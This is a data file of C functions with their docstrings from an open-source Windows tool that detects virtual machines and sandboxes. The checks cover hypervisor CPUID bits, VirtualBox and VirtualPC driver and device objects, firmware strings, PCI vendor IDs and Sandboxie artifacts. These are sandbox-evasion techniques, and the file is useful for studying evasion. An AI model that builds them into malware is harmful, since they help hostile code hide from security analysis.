{"docstring": "/*\n* supCopyMemory\n*\n* Purpose:\n*\n* Copies bytes between buffers.\n*\n* dest - Destination buffer\n* cbdest - Destination buffer size in bytes\n* src - Source buffer\n* cbsrc - Source buffer size in bytes\n*\n*/\n", "func_signal": "void supCopyMemory(\n    _Inout_ void *dest,\n    _In_ size_t cbdest,\n    _In_ const void *src,\n    _In_ size_t cbsrc\n)", "code": "{\n    char *d = (char*)dest;\n    char *s = (char*)src;\n\n    if ((dest == 0) || (src == 0) || (cbdest == 0))\n        return;\n    if (cbdest < cbsrc)\n        cbsrc = cbdest;\n\n    while (cbsrc > 0) {\n        *d++ = *s++;\n        cbsrc--;\n    }\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supEnablePrivilege\n*\n* Purpose:\n*\n* Enable/Disable given privilege.\n*\n* Return FALSE on any error.\n*\n*/\n", "func_signal": "BOOL supEnablePrivilege(\n    _In_ DWORD\tPrivilegeName,\n    _In_ BOOL\tfEnable\n)", "code": "{\n    BOOL bResult = FALSE;\n    NTSTATUS status;\n    HANDLE hToken;\n    TOKEN_PRIVILEGES TokenPrivileges;\n\n    status = NtOpenProcessToken(\n        GetCurrentProcess(),\n        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,\n        &hToken);\n\n    if (!NT_SUCCESS(status)) {\n        return bResult;\n    }\n\n    TokenPrivileges.PrivilegeCount = 1;\n    TokenPrivileges.Privileges[0].Luid.LowPart = PrivilegeName;\n    TokenPrivileges.Privileges[0].Luid.HighPart = 0;\n    TokenPrivileges.Privileges[0].Attributes = (fEnable) ? SE_PRIVILEGE_ENABLED : 0;\n    status = NtAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges,\n        sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL);\n    if (status == STATUS_NOT_ALL_ASSIGNED) {\n        status = STATUS_PRIVILEGE_NOT_HELD;\n    }\n    bResult = NT_SUCCESS(status);\n    NtClose(hToken);\n    return bResult;\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* IsHypervisor\n*\n* Purpose:\n*\n* Query if hypervisor present.\n*\n*/\n", "func_signal": "BOOL IsHypervisor(\n    _Out_ DETECT_FLAG *Hypervisor\n)", "code": "{\n    int CPUInfo[4] = { -1 };\n    DETECT_FLAG Type = DETECT_BASE_NOTHING;\n\n    //\n    // Query hypervisor presence.\n    // http://msdn.microsoft.com/en-us/library/windows/hardware/ff538624(v=vs.85).aspx\n    // be aware this detection can be bogus\n    //\n\n    __cpuid(CPUInfo, 1);\n    if ((CPUInfo[2] >> 31) & 1) {\n        Type |= DETECT_HYPERVISOR_BIT;\n    }\n\n    //\n    // Hypervisor additional special case\n    //\n    if (supIsObjectExists(DEVICELINK, DEVICE_HYPER_V))\n        Type |= DETECT_DEVICE_OBJECT_NAME;\n\n    *Hypervisor = Type;\n    return (Type != DETECT_BASE_NOTHING);\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* AmISandboxed\n*\n* Purpose:\n*\n* Return TRUE if current application is running in Sandboxie.\n*\n*/\n", "func_signal": "BOOL AmISandboxed(\n    _Out_ DETECT_FLAG *IsAppSandboxed\n)", "code": "{\n    BOOL cond = FALSE;\n    BOOL IsSB = FALSE;\n    SIZE_T Length = 0L;\n    NTSTATUS Status;\n    HANDLE hDummy;\n    DETECT_FLAG Type = DETECT_BASE_NOTHING;\n    ULONG_PTR k, i, FileID = 0xFFFFFFFF, OurID = GetCurrentProcessId();\n    PSYSTEM_HANDLE_INFORMATION HandleTable;\n    MEMORY_BASIC_INFORMATION RegionInfo;\n    WCHAR szObjectName[MAX_PATH + 1];\n\n    hDummy = NULL;\n    HandleTable = NULL;\n\n    do {\n\n        // Find Sandboxie API device inside our handle table.\n        if (!supOpenDevice(L\"\\\\Device\\\\Null\", GENERIC_READ, &hDummy))\n            break;\n\n        HandleTable = (PSYSTEM_HANDLE_INFORMATION)supGetSystemInfo(SystemHandleInformation);\n        if (HandleTable == NULL)\n            break;\n\n        for (k = 0; k < 2; k++) {\n            for (i = 0; i < HandleTable->NumberOfHandles; i++) {\n                if (HandleTable->Handles[i].UniqueProcessId == OurID)\n                    if (k == 0) {\n                        if (HandleTable->Handles[i].HandleValue == (USHORT)(ULONG_PTR)hDummy) {\n                            FileID = HandleTable->Handles[i].ObjectTypeIndex;\n                            break;\n                        }\n                    }\n                    else {\n                        if (HandleTable->Handles[i].ObjectTypeIndex == FileID) {\n\n                            RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));\n                            if (supQueryObjectName(\n                                (HANDLE)(ULONG_PTR)HandleTable->Handles[i].HandleValue,\n                                &szObjectName, MAX_PATH * sizeof(WCHAR))\n                                )\n                            {\n                                if (_strstr_w(szObjectName, VENDOR_SANDBOXIE) != NULL) {\n                                    Type |= DETECT_HANDLE_TABLE;\n                                    IsSB = TRUE;\n                                    break;\n                                }\n                            }\n\n                        }\n                    }\n            }\n        }\n\n        // Brute-force memory to locate Sandboxie injected code and locate sandboxie tag.\n\n        i = (ULONG_PTR)g_siSysInfo.lpMinimumApplicationAddress;\n        do {\n\n            Status = NtQueryVirtualMemory(GetCurrentProcess(), (PVOID)i, MemoryBasicInformation,\n                &RegionInfo, sizeof(MEMORY_BASIC_INFORMATION), &Length);\n            if (NT_SUCCESS(Status)) {\n\n                if (supIsExecutableCode(RegionInfo.AllocationProtect, RegionInfo.State)) {\n                    for (k = i; k < i + RegionInfo.RegionSize; k += sizeof(DWORD)) {\n                        if (\n                            (*(PDWORD)k == 'kuzt') ||\n                            (*(PDWORD)k == 'xobs')\n                            )\n                        {\n                            IsSB = TRUE;\n                            Type |= DETECT_MEMORY_TAG;\n                            break;\n                        }\n                    }\n                }\n                i += RegionInfo.RegionSize;\n            }\n            else {\n                i += 0x1000;\n            }\n        } while (i < (ULONG_PTR)g_siSysInfo.lpMaximumApplicationAddress);\n\n        // Check if Sandboxie virtual registry present.\n\n        IsSB = IsSandboxieVirtualRegistryPresent();\n        if (IsSB) Type |= DETECT_VIRTUAL_REGISTRY;\n\n    } while (cond);\n\n    if (HandleTable) {\n        HeapFree(GetProcessHeap(), 0, HandleTable);\n    }\n    if (hDummy != NULL) {\n        NtClose(hDummy);\n    }\n\n    *IsAppSandboxed = Type;\n    return IsSB;\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supMutexExist\n*\n* Purpose:\n*\n* Return TRUE if given mutex already exists, FALSE otherwise.\n*\n*/\n", "func_signal": "BOOL supMutexExist(\n    _In_ LPWSTR lpMutexName\n)", "code": "{\n    DWORD dwError;\n    HANDLE hObject = NULL;\n\n    if (lpMutexName == NULL) {\n        return FALSE;\n    }\n\n    SetLastError(0);\n    hObject = CreateMutex(NULL, FALSE, lpMutexName);\n    dwError = GetLastError();\n\n    if (hObject) {\n        CloseHandle(hObject);\n    }\n    return (dwError == ERROR_ALREADY_EXISTS);\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supEnumSystemObjects\n*\n* Purpose:\n*\n* Lookup object by name in given directory.\n*\n*/\n", "func_signal": "NTSTATUS NTAPI supEnumSystemObjects(\n    _In_opt_ LPWSTR pwszRootDirectory,\n    _In_opt_ HANDLE hRootDirectory,\n    _In_ PENUMOBJECTSCALLBACK CallbackProc,\n    _In_opt_ PVOID CallbackParam\n)", "code": "{\n    BOOL\t\t\t\tcond = TRUE;\n    ULONG\t\t\t\tctx, rlen;\n    HANDLE\t\t\t\thDirectory = NULL;\n    NTSTATUS\t\t\tstatus;\n    NTSTATUS\t\t\tCallbackStatus;\n    OBJECT_ATTRIBUTES\tattr;\n    UNICODE_STRING\t\tsname;\n\n    POBJECT_DIRECTORY_INFORMATION\tobjinf;\n\n    if (CallbackProc == NULL) {\n        return STATUS_INVALID_PARAMETER_4;\n    }\n\n    status = STATUS_UNSUCCESSFUL;\n\n    __try {\n\n        // We can use root directory.\n        if (pwszRootDirectory != NULL) {\n            RtlSecureZeroMemory(&sname, sizeof(sname));\n            RtlInitUnicodeString(&sname, pwszRootDirectory);\n            InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);\n            status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);\n            if (!NT_SUCCESS(status)) {\n                return status;\n            }\n        }\n        else {\n            if (hRootDirectory == NULL) {\n                return STATUS_INVALID_PARAMETER_2;\n            }\n            hDirectory = hRootDirectory;\n        }\n\n        // Enumerate objects in directory.\n        ctx = 0;\n        do {\n\n            rlen = 0;\n            status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);\n            if (status != STATUS_BUFFER_TOO_SMALL)\n                break;\n\n            objinf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, rlen);\n            if (objinf == NULL)\n                break;\n\n            status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);\n            if (!NT_SUCCESS(status)) {\n                HeapFree(GetProcessHeap(), 0, objinf);\n                break;\n            }\n\n            CallbackStatus = CallbackProc(objinf, CallbackParam);\n\n            HeapFree(GetProcessHeap(), 0, objinf);\n\n            if (NT_SUCCESS(CallbackStatus)) {\n                status = STATUS_SUCCESS;\n                break;\n            }\n\n        } while (cond);\n\n        if (hDirectory != NULL) {\n            NtClose(hDirectory);\n        }\n\n    }\n    __except (EXCEPTION_EXECUTE_HANDLER) {\n        status = STATUS_ACCESS_VIOLATION;\n    }\n\n    return status;\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supIsObjectExists\n*\n* Purpose:\n*\n* Return TRUE if the given object exists, FALSE otherwise.\n*\n*/\n", "func_signal": "BOOL supIsObjectExists(\n    _In_ LPWSTR RootDirectory,\n    _In_ LPWSTR ObjectName\n)", "code": "{\n    OBJSCANPARAM Param;\n\n    if (ObjectName == NULL) {\n        return FALSE;\n    }\n\n    Param.Buffer = ObjectName;\n    Param.BufferSize = (ULONG)_strlen_w(ObjectName);\n\n    return NT_SUCCESS(supEnumSystemObjects(RootDirectory, NULL, supDetectObjectCallback, &Param));\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supOpenDevice\n*\n* Purpose:\n*\n* Open handle by device name.\n*\n*/\n", "func_signal": "BOOL supOpenDevice(\n    _In_ LPWSTR lpDeviceName,\n    _In_ ACCESS_MASK DesiredAccess,\n    _Out_opt_ PHANDLE phDevice\n)", "code": "{\n    OBJECT_ATTRIBUTES attr;\n    IO_STATUS_BLOCK iost;\n\n    UNICODE_STRING uDevName;\n\n    HANDLE hDevice;\n    NTSTATUS Status;\n\n    if (phDevice) {\n        *phDevice = NULL;\n    }\n    if (lpDeviceName == NULL) {\n        return FALSE;\n    }\n\n    hDevice = NULL;\n    RtlSecureZeroMemory(&uDevName, sizeof(uDevName));\n    RtlInitUnicodeString(&uDevName, lpDeviceName);\n    InitializeObjectAttributes(&attr, &uDevName, OBJ_CASE_INSENSITIVE, 0, NULL);\n\n    Status = NtCreateFile(&hDevice, DesiredAccess, &attr, &iost, NULL, 0,\n        0, FILE_OPEN, 0, NULL, 0);\n    if (NT_SUCCESS(Status)) {\n        if (phDevice != NULL) {\n            *phDevice = hDevice;\n        }\n    }\n\n    return NT_SUCCESS(Status);\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supIs64BitWindows\n*\n* Purpose:\n*\n* Detect win32 subsystem execution mode and platform.\n*\n*/\n", "func_signal": "BOOL supIs64BitWindows(\n    _In_ PBOOL pf64\n)", "code": "{\n    if (!pf64)\n        return FALSE;\n\n#if defined(_WIN64)\n    return TRUE;  // 64-bit programs run only on Win64\n#elif defined(_WIN32)\n    // 32-bit programs run on both 32-bit and 64-bit Windows\n    *pf64 = supIsProcess32bit(GetCurrentProcess());\n    return *pf64;\n#else\n    return FALSE; // Win64 does not support Win16\n#endif\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* CheckForVirtualBoxVM\n*\n* Purpose:\n*\n* Detect VirtualBox VM.\n*\n*/\n", "func_signal": "VOID CheckForVirtualBoxVM(\n    _Out_ DETECT_FLAG *VirtualBox\n)", "code": "{\n    BOOL IsVM = FALSE;\n    ULONG dwDataSize = 0L;\n    SYSTEM_FIRMWARE_TABLE_INFORMATION *sfti = NULL;\n    DETECT_FLAG Type = DETECT_BASE_NOTHING;\n\n    // Query vbox additions guest device.\n    if (supIsObjectExists(DEVICELINK, DEVICE_VIRTUALBOX1))\n        Type |= DETECT_DEVICE_OBJECT_NAME;\n\n    // Query vbox additions symbolic link.\n    if (supIsObjectExists(DEVICELINK, DEVICE_VIRTUALBOX2))\n        Type |= DETECT_DEVICE_OBJECT_NAME;\n\n    // Query vbox additions video driver, reg. rights elevation.\n    if (supIsObjectExists(DRIVERLINK, DRIVER_VIRTUALBOX1))\n        Type |= DETECT_DRIVER_OBJECT_NAME;\n\n    // Query vbox additions mouse driver, reg. admin rights elevation.\n    if (supIsObjectExists(DRIVERLINK, DRIVER_VIRTUALBOX2))\n        Type |= DETECT_DRIVER_OBJECT_NAME;\n\n    // Scan raw firmware for specific string patterns.\n    sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)supGetFirmwareTable(&dwDataSize, FIRM, 0xC0000);\n    if (sfti) {\n        IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_VBOX, (ULONG)_strlen_a(VENDOR_VBOX));\n        if (IsVM == FALSE) {\n            IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_ORACLE, (ULONG)_strlen_a(VENDOR_ORACLE));\n        }\n        if (IsVM == FALSE) {\n            IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_INNOTEK, (ULONG)_strlen_a(VENDOR_INNOTEK));\n        }\n        HeapFree(GetProcessHeap(), 0, sfti);\n\n        if (IsVM != FALSE) Type |= DETECT_SIGNATURE_SCAN_FIRM;\n    }\n\n    // Scan raw SMBIOS firmware table for specific string patterns.\n    sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)supGetFirmwareTable(&dwDataSize, RSMB, 0);\n    if (sfti) {\n        IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_VBOX, (ULONG)_strlen_a(VENDOR_VBOX));\n        if (IsVM == FALSE) {\n            IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_ORACLE, (ULONG)_strlen_a(VENDOR_ORACLE));\n        }\n        if (IsVM == FALSE) {\n            IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_INNOTEK, (ULONG)_strlen_a(VENDOR_INNOTEK));\n        }\n        HeapFree(GetProcessHeap(), 0, sfti);\n\n        if (IsVM != FALSE) Type |= DETECT_SIGNATURE_SCAN_RSMB;\n    }\n\n    // Query oracle VID on PCI bus devices. \n    if (vIsInList(VID_ORACLE) != NULL)\n        Type |= DETECT_PCI_HWID;\n\n    *VirtualBox = Type;\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* vIsInList\n*\n* Purpose:\n*\n* Return TRUE if the given VendorID is in list, FALSE otherwise.\n*\n*/\n", "func_signal": "PVENDOR_ENTRY vIsInList(\n    DWORD VendorID\n)", "code": "{\n    PLIST_ENTRY entry = VendorsListHead.Flink;\n    PVENDOR_ENTRY vendorEntry;\n\n    while ((entry != NULL) && (entry != &VendorsListHead)) {\n\n        vendorEntry = CONTAINING_RECORD(entry, VENDOR_ENTRY, ListEntry);\n        if (vendorEntry->VendorID == VendorID)\n            return vendorEntry;\n\n        entry = entry->Flink;\n    }\n    return FALSE;\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supGetSystemInfo\n*\n* Purpose:\n*\n* Returns buffer with system information by given InfoClass.\n*\n* Returned buffer must be freed with HeapFree after usage.\n* Function will return error after 100 attempts.\n*\n*/\n", "func_signal": "PVOID supGetSystemInfo(\n    _In_ SYSTEM_INFORMATION_CLASS InfoClass\n)", "code": "{\n    INT         c = 0;\n    PVOID       Buffer = NULL;\n    ULONG       Size = 0x1000;\n    NTSTATUS    status;\n    ULONG       memIO;\n\n    do {\n        Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)Size);\n        if (Buffer != NULL) {\n            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);\n        }\n        else {\n            return NULL;\n        }\n        if (status == STATUS_INFO_LENGTH_MISMATCH) {\n            HeapFree(GetProcessHeap(), 0, Buffer);\n            Buffer = NULL;\n            Size *= 2;\n            c++;\n            if (c > 100) {\n                status = STATUS_SECRET_TOO_LONG;\n                break;\n            }\n        }\n    } while (status == STATUS_INFO_LENGTH_MISMATCH);\n\n    if (NT_SUCCESS(status)) {\n        return Buffer;\n    }\n\n    if (Buffer) {\n        HeapFree(GetProcessHeap(), 0, Buffer);\n    }\n    return NULL;\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* vExtractID\n*\n* Purpose:\n*\n* Extract ID from string.\n*\n*/\n", "func_signal": "VOID vExtractID(\n    PVENDOR_ENTRY entry\n)", "code": "{\n    WCHAR szBuffer[MAX_PATH + 1];\n\n    if (entry == NULL) {\n        return;\n    }\n\n    if (entry->VendorFullName[0] == 0)\n        return;\n\n    // e.g. \"VEN_XXXX&DEV_XXXX&SUBSYS_XXXXXXXX&REV_XX\" \n    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));\n    _strcpy_w(szBuffer, &entry->VendorFullName[4]);\n    szBuffer[4] = 0;\n    entry->VendorID = (DWORD)hextou64_w(szBuffer);\n\n    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));\n    _strcpy_w(szBuffer, &entry->VendorFullName[13]);\n    szBuffer[4] = 0;\n    entry->DeviceID = (DWORD)hextou64_w(szBuffer);\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* EnumPCIDevsReg\n*\n* Purpose:\n*\n* Build PCI devices list.\n*\n*/\n", "func_signal": "VOID EnumPCIDevsReg(\n    VOID\n)", "code": "{\n    BOOL cond = FALSE;\n    HANDLE hKey = NULL;\n    SIZE_T sz;\n    DWORD dwKeySubIndex = 0;\n    ULONG ResultLength = 0;\n    NTSTATUS Status = STATUS_UNSUCCESSFUL;\n\n    UNICODE_STRING ustrKeyName;\n    OBJECT_ATTRIBUTES obja;\n    PKEY_BASIC_INFORMATION pKeyInfo = NULL;\n\n    PVENDOR_ENTRY entry;\n\n    RtlSecureZeroMemory(&ustrKeyName, sizeof(ustrKeyName));\n    RtlInitUnicodeString(&ustrKeyName, REGSTR_KEY_PCIENUM);\n    InitializeObjectAttributes(&obja, &ustrKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);\n\n    do {\n\n        Status = NtOpenKey(&hKey, KEY_ENUMERATE_SUB_KEYS, &obja);\n        if ((hKey == NULL) && (!NT_SUCCESS(Status))) {\n            break;\n        }\n\n        do {\n            NtEnumerateKey(hKey, dwKeySubIndex, KeyBasicInformation,\n                NULL, 0, &ResultLength);\n\n            pKeyInfo = (PKEY_BASIC_INFORMATION)HeapAlloc(GetProcessHeap(),\n                HEAP_ZERO_MEMORY, ResultLength);\n\n            if (pKeyInfo == NULL) {\n                break;\n            }\n\n            Status = NtEnumerateKey(hKey, dwKeySubIndex, KeyBasicInformation,\n                pKeyInfo, ResultLength, &ResultLength);\n\n            if (NT_SUCCESS(Status)) {\n\n                entry = (PVENDOR_ENTRY)HeapAlloc(GetProcessHeap(),\n                    HEAP_ZERO_MEMORY, sizeof(VENDOR_ENTRY));\n\n                if (entry) {\n\n                    sz = pKeyInfo->NameLength / sizeof(WCHAR);\n                    if (sz > MAX_PATH) sz = MAX_PATH;\n\n                    supCopyMemory(entry->VendorFullName, MAX_PATH * sizeof(WCHAR),\n                        pKeyInfo->Name, sz * sizeof(WCHAR));\n\n                    vExtractID(entry);\n                    InsertHeadList(&VendorsListHead, &entry->ListEntry);\n                }\n\n                HeapFree(GetProcessHeap(), 0, pKeyInfo);\n                pKeyInfo = NULL;\n            }\n            dwKeySubIndex++;\n\n        } while (NT_SUCCESS(Status));\n\n    } while (cond);\n\n    if (hKey != NULL) {\n        NtClose(hKey);\n    }\n    if (pKeyInfo != NULL) {\n        HeapFree(GetProcessHeap(), 0, pKeyInfo);\n    }\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* CheckForVirtualPC\n*\n* Purpose:\n*\n* Detect VirtualPC VM.\n* Note: there is no x64 Guest support in VirtualPC.\n*\n*/\n", "func_signal": "VOID CheckForVirtualPC(\n    _Out_ DETECT_FLAG *VirtualPC\n)", "code": "{\n    BOOL IsVM = FALSE;\n    ULONG dwDataSize = 0L;\n    SYSTEM_FIRMWARE_TABLE_INFORMATION *sfti = NULL;\n    DETECT_FLAG Type = DETECT_BASE_NOTHING;\n\n    // Devs of XP Mode we're so kind so they added special mutex, check it.\n    if (supMutexExist(MUTEX_VPCXPMODE))\n        Type |= DETECT_MUTEX_NAME;\n\n    //  Use well-known trick with illegal instructions.\n    if (IsVPCGuest())\n        Type |= DETECT_INSTRUCTION_BACKDOOR;\n\n    //\n    // Query virtual pc device. \n    //\n    if (supIsObjectExists(DEVICELINK, DEVICE_VIRTUALPC))\n        Type |= DETECT_DEVICE_OBJECT_NAME;\n\n    // Query virtual pc driver, reg. rights elevation. \n    if (supIsObjectExists(DRIVERLINK, DRIVER_VIRTUALPC))\n        Type |= DETECT_DRIVER_OBJECT_NAME;\n\n    // Scan raw firmware for specific string patterns. \n    sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)supGetFirmwareTable(&dwDataSize, FIRM, 0xC0000);\n    if (sfti) {\n        IsVM = supScanDump((CHAR*)sfti, dwDataSize, VENDOR_VPC, (ULONG)_strlen_a(VENDOR_VPC));\n        HeapFree(GetProcessHeap(), 0, sfti);\n        if (IsVM != FALSE) {\n            Type |= DETECT_SIGNATURE_SCAN_FIRM;\n        }\n    }\n\n    // Scan raw smbios data for specific string patters.\n    sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)supGetFirmwareTable(&dwDataSize, RSMB, 0);\n    if (sfti) {\n        IsVM = supScanDump((CHAR*)sfti, dwDataSize, SMB_VPC, (ULONG)_strlen_a(SMB_VPC));\n        HeapFree(GetProcessHeap(), 0, sfti);\n        if (IsVM != FALSE) {\n            Type |= DETECT_SIGNATURE_SCAN_RSMB;\n        }\n    }\n\n    // Query S3 VID on PCI bus devices. \n    if (vIsInList(VID_S3MS) != NULL)\n        Type |= DETECT_PCI_HWID;\n\n    *VirtualPC = Type;\n}", "path": "src\\vmde\\detect.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* supGetFirmwareTable\n*\n* Purpose:\n*\n* GetSystemFirmwareTable reimplemented.\n*\n*/\n", "func_signal": "PVOID supGetFirmwareTable(\n    _In_opt_\tPULONG pdwDataSize,\n    _In_\t\tDWORD dwSignature,\n    _In_\t\tDWORD dwTableID\n)", "code": "{\n    NTSTATUS Status;\n    ULONG Length;\n    HANDLE hProcess = NULL;\n    ULONG_PTR uAddress;\n    SYSTEM_FIRMWARE_TABLE_INFORMATION *sfti = NULL;\n    SIZE_T memIO = 0;\n\n    CLIENT_ID cid;\n    OBJECT_ATTRIBUTES attr;\n    MEMORY_REGION_INFORMATION memInfo;\n\n    // Use documented GetSystemFirmwareTable instead, this is it raw implementation.\n    if (g_osver.dwMajorVersion > 5) {\n\n        Length = 0x1000;\n        sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Length);\n        if (sfti != NULL) {\n            sfti->Action = SystemFirmwareTable_Get;\n            sfti->ProviderSignature = dwSignature;\n            sfti->TableID = dwTableID;\n            sfti->TableBufferLength = Length;\n\n            // Query if info class available and if how many memory we need.\n            Status = NtQuerySystemInformation(SystemFirmwareTableInformation, sfti, Length, &Length);\n            if (\n                (Status == STATUS_INVALID_INFO_CLASS) ||\n                (Status == STATUS_INVALID_DEVICE_REQUEST) ||\n                (Status == STATUS_NOT_IMPLEMENTED) ||\n                (Length == 0)\n                )\n            {\n                HeapFree(GetProcessHeap(), 0, sfti);\n                return NULL;\n            }\n\n            if (Status == STATUS_BUFFER_TOO_SMALL) {\n\n                HeapFree(GetProcessHeap(), 0, sfti);\n\n                sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Length);\n                if (sfti != NULL) {\n                    sfti->Action = SystemFirmwareTable_Get;\n                    sfti->ProviderSignature = dwSignature;\n                    sfti->TableID = dwTableID;\n                    sfti->TableBufferLength = Length;\n                    Status = NtQuerySystemInformation(SystemFirmwareTableInformation, sfti, Length, &Length);\n                    if (!NT_SUCCESS(Status)) {\n                        HeapFree(GetProcessHeap(), 0, sfti);\n                        return NULL;\n                    }\n                    if (pdwDataSize) {\n                        *pdwDataSize = Length;\n                    }\n                }\n            }\n            else {\n                if (pdwDataSize) {\n                    *pdwDataSize = Length;\n                }\n            }\n        }\n    }\n    else {\n        //\n        //  On pre Vista systems the above info class unavailable, but all required information.\n        //  can be found inside csrss  memory space (stored here for VDM purposes) at few fixed addresses.\n        //\n        if ((dwSignature != FIRM) && (dwSignature != RSMB)) {\n            return NULL;\n        }\n\n        // we are interested only in two memory regions \n        switch (dwSignature) {\n        case FIRM:\n            uAddress = 0xC0000; // FIRM analogue \n            break;\n        case RSMB:\n            uAddress = 0xE0000; // RSMB analogue \n            break;\n        default:\n            return NULL;\n            break;\n        }\n\n        Length = 0;\n        cid.UniqueProcess = (HANDLE)(ULONG_PTR)CsrGetProcessId();\n        cid.UniqueThread = 0;\n        InitializeObjectAttributes(&attr, NULL, 0, 0, NULL);\n\n        // open csrss, reg. client debug privilege set \n        Status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid);\n        if (NT_SUCCESS(Status)) {\n\n            // get memory data region size for buffer allocation\n            Status = NtQueryVirtualMemory(hProcess, (PVOID)uAddress, MemoryRegionInformation, &memInfo, sizeof(MEMORY_REGION_INFORMATION), &memIO);\n            if (NT_SUCCESS(Status)) {\n\n                sfti = (PSYSTEM_FIRMWARE_TABLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, memInfo.RegionSize);\n                if (sfti != NULL) {\n\n                    // read data to our allocated buffer \n                    Status = NtReadVirtualMemory(hProcess, (PVOID)uAddress, sfti, memInfo.RegionSize, &memIO);\n                    if (NT_SUCCESS(Status)) {\n\n                        if (pdwDataSize) {\n                            *pdwDataSize = (ULONG)memInfo.RegionSize;\n                        }\n                    }\n                    else {\n                        HeapFree(GetProcessHeap(), 0, sfti);\n                        return NULL;\n                    }\n                }\n            }\n            NtClose(hProcess);\n        }\n    }\n    return sfti;\n}", "path": "src\\vmde\\sup.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
{"docstring": "/*\n* DetectSystemInfo\n*\n* Purpose:\n*\n* Remember system version and system info to global variables.\n*\n*/\n", "func_signal": "VOID DetectSystemInfo(\n    VOID\n)", "code": "{\n    NTSTATUS Status;\n\n    g_IsWin64 = supIs64BitWindows(&g_IsWow64);\n    if (g_IsWow64) {\n        GetNativeSystemInfo(&g_siSysInfo);\n    }\n    else {\n        GetSystemInfo(&g_siSysInfo);\n    }\n\n    RtlSecureZeroMemory(&g_osver, sizeof(g_osver));\n    g_osver.dwOSVersionInfoSize = sizeof(g_osver);\n\n    Status = RtlGetVersion(&g_osver);\n    if (NT_SUCCESS(Status)) {\n        if (g_osver.dwMajorVersion < 6) {\n            supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);\n        }\n    }\n}", "path": "src\\vmde\\main.c", "repo_name": "hfiref0x/VMDE", "stars": 163, "license": "mit", "language": "c", "size": 917}
